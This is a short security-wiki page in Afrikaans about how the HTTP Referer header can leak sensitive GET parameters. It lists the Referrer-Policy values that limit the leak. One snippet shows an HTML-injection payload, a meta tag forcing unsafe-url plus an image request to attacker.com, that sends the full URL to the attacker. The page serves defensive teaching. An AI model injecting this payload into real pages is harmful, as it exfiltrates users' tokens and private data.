# Interessante HTTP

{{#include ../banners/hacktricks-training.md}}

## Referrer headers and policy

Referrer is die header wat deur browsers gebruik word om aan te dui watter vorige bladsy besoek is.

### Sensitive information leak

As enige sensitiewe inligting op 'n stadium binne 'n webblad in GET request-parameters geleë is, en as die bladsy skakels na eksterne bronne bevat of 'n aanvaller die gebruiker kan laat/suggereer (social engineering) om 'n URL te besoek wat deur die aanvaller beheer word, kan die sensitiewe inligting binne die jongste GET request uitgevoer word.

### Mitigation

Jy kan die browser 'n **Referrer-policy** laat volg wat kan **verhoed** dat die sensitiewe inligting na ander webtoepassings gestuur word:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
### Teenmaatreël

Jy kan hierdie reël override deur ’n HTML meta tag te gebruik (die attacker moet ’n HTML injection exploit):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Verdediging

Moet nooit enige sensitiewe data binne GET-parameters of -paaie in die URL plaas nie.

{{#include ../banners/hacktricks-training.md}}
